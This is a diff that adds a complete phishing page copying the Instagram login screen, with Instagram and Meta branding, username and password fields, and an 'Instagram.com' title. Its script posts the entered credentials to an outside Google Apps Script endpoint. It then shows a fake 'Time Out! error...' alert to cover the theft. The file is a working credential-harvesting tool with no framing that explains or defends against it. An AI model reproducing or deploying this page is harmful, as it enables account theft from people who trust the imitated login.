@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram.com</title>
+    <link rel="shortcut icon" href="https://static-00.iconduck.com/assets.00/instagram-icon-512x511-1e54z7gr.png" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            height: 100vh;
+            background-color: rgba(128, 128, 128, 0.078);
+        }
+
+        .main {
+            padding: 10px;
+            width: 270px;
+            height: 480px;
+            /* border: 1px solid black; */
+            /* background-image: url("https://images.ctfassets.net/h6goo9gw1hh6/2wFhCUJ584w0dmahdZnWik/52423d585f0302334a2cedd6882e1e9e/Made_from_scratch_1.jpg?w=1080&h=1920&fl=progressive&q=70&fm=jpg"); */
+            /* background-size: contain; */
+            background-color: rgba(128, 128, 128, 0.078);
+        }
+
+        #arrow {
+            width: 100%;
+            height: 3%;
+            /* border: 1px solid red; */
+            background-image: url("https://static-00.iconduck.com/assets.00/arrow-back-icon-512x428-u2v4avgp.png");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        p {
+            cursor: not-allowed;
+            margin-top: 10px;
+            width: 100%;
+            height: 4%;
+            /* border: 1px solid green; */
+            text-align: center;
+        }
+
+        #logo {
+
+            position: relative;
+            display: inline-block;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+            width: 100%;
+            height: 12%;
+            /* border: 1px solid red; */
+        }
+
+        #photo {
+            margin: auto;
+            height: 84%;
+            width: 46px;
+            /* background-color: red; */
+            background-image: url("https://static-00.iconduck.com/assets.00/instagram-icon-512x512-y9hi29pw.png");
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+
+        #user {
+            position: relative;
+            /* margin-top: 50px; */
+            width: 100%;
+            height: 80%;
+            /* background-color: black; */
+        }
+
+        input {
+            padding: 10px;
+            font-size: 12px;
+            margin-top: 20px;
+            border-radius: 8px;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            text-decoration: none;
+            border: 1px solid gray;
+        }
+
+        button {
+            width: 100%;
+            height: 100%;
+            background-color: blue;
+            color: white;
+            border-radius: 50px;
+            /* border: 1px solid gray; */
+        }
+
+        #btnbox {
+            display: block;
+            justify-content: center;
+            align-items: center;
+            margin: auto;
+            margin-top: 30px;
+            width: 100%;
+            height: 40px;
+            /* background-color: black; */
+            border-radius: 50px;
+        }
+
+        #forgot {
+            cursor: pointer;
+            text-align: center;
+            margin-top: 10px;
+            width: 100%;
+            height: 20px;
+            /* border: 1px solid greenyellow; */
+        }
+
+        #create {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 30px;
+            width: 100%;
+            height: 40px;
+            border: 1px solid blue;
+            border-radius: 50px;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        #last {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 20px;
+            width: 100%;
+            height: 30px;
+            /* background-color: red; */
+        }
+
+        #meta {
+            position: relative;
+
+            width: 30px;
+            height: 20px;
+            /* background-color: palegoldenrod; */
+            background-image: url("https://static-00.iconduck.com/assets.00/meta-line-logo-icon-512x364-qy9djp41.png");
+            background-size: contain;
+            background-repeat: no-repeat;
+
+        }
+
+        #p {
+            cursor: not-allowed;
+            align-content: center;
+            position: relative;
+            color: gray;
+            left: 8px;
+            width: auto;
+            height: 30px;
+            /* background-color: palegoldenrod; */
+
+        }
+
+        @media (min-width:375px) and (max-width:810px) {
+            .main {
+                /* background-attachment: fixed; */
+                padding: 10px;
+                width: 100%;
+                height: 100vh;
+                /* border: 1px solid black; */
+                /* background-image: url("https://images.ctfassets.net/h6goo9gw1hh6/2wFhCUJ584w0dmahdZnWik/52423d585f0302334a2cedd6882e1e9e/Made_from_scratch_1.jpg?w=1080&h=1920&fl=progressive&q=70&fm=jpg"); */
+                background-color: rgba(128, 128, 128, 0.078);
+                background-size: cover;
+            }
+        }
+
+        @media (min-width:375px) and (max-width:810px) {
+
+            #create {
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-top: 250px;
+                width: 100%;
+                height: 40px;
+                border: 1px solid blue;
+                border-radius: 50px;
+            }
+
+            #last {
+                position: relative;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                margin-bottom: 400px;
+                width: 100%;
+                height: 30px;
+                /* background-color: red; */
+            }
+
+        }
+
+        @media (min-width:375px) and (max-width:810px) {
+            input {
+                padding: 10px;
+                font-size: 18px;
+                margin-top: 20px;
+                border-radius: 8px;
+                width: 100%;
+                height: 66%;
+                background-color: white;
+                text-decoration: none;
+                border: 1px solid gray;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <form method="post" name="google-sheet">
+        <div class="main">
+
+            <div id="arrow"></div>
+            <p>English (india)</p>
+            <div id="logo">
+                <div id="photo"></div>
+                <div id="user">
+                    <input type="text" name="username" placeholder="Username,email address or mobile num...">
+                    <input type="password" name="password" placeholder="Password">
+                    <div id="btnbox">
+                        <button type="submit" value="submit">Sign in</button>
+                        <!-- <input type="button" value="signin"> -->
+                        <div id="forgot">Forgotten Password ?</div>
+                        <div id="create">
+                            <!-- <a href="hello">Create new account</a> -->
+                            Create new account
+                        </div>
+                        <div id="last">
+                            <div id="meta">
+                            </div>
+                            <div id="p">Meta</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </form>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbz_63iDaXX8BztC8nRDiI3zM04bnK3yxGwa3mWHpL0rVMdhEzLsOH85tkm_BUY4b3NJ/exec'
+        const form = document.forms['google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => alert("Time Out! error..."))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
+
+</html>
